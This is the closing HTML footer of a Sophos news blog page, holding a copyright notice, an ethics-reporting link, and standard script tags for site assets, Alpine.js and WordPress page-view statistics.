					href="https://secure.ethicspoint.eu/domain/media/en/gui/104916/index.html"
				>
					Speak Out				</a>
			</li>
		</ul>
	</div>
</span>

					<!-- Copyright -->
					<div class="md:ml-6 mt-2 md:mt-0">
						<span
							class="whitespace-nowrap font-sansMedium text-sophos-gray-600 inline-block text-xs font-medium leading-tight"
						>
							&copy; 1997 - 2022 Sophos Ltd. All rights reserved						</span>
					</div>
				</div>
			</div>
			</div>
		</div>
	</footer>
	<script id='sophos-js-core-js-extra'>
var PG8Data = {"startPage":"1","maxPages":"1","nextLink":""};
</script>
<script type="text/javascript" src="https://news.sophos.com/_static/??-eJyVjGEOwiAMRi8kZRCn/jGehZBmA6UQWp3Ht2YXGOn36+W92q2ZWEmQxMqKBdlybWtlwo2Nn9zVZtapVJ8JzceDB6cAdgCZT/bQj1j7gI1f6YGP+zuCt6TXeBVDaSEtNBy20IWwD3dLGE7+TKNHubvLfDvPelP+AaC7oEI=" ></script><script src='https://cdn.jsdelivr.net/gh/alpinejs/alpine@v2.8.1/dist/alpine.min.js?ver=2.0.1' id='alpine-js-js'></script>
<script type="text/javascript" src="https://news.sophos.com/wp-includes/js/comment-reply.min.js?m=1658827588g" ></script><script src='https://stats.wp.com/e-202231.js' defer></script>
<script>
	_stq = window._stq || [];
	_stq.push([ 'view', {v:'ext',j:'1:11.1.2',blog:'166161023',post:'72266',tz:'-4',srv:'news.sophos.com',hp:'vip'} ]);
	_stq.push([ 'clickTrackerInit', '166161023', '72266' ]);
</script>
</body>
</html>
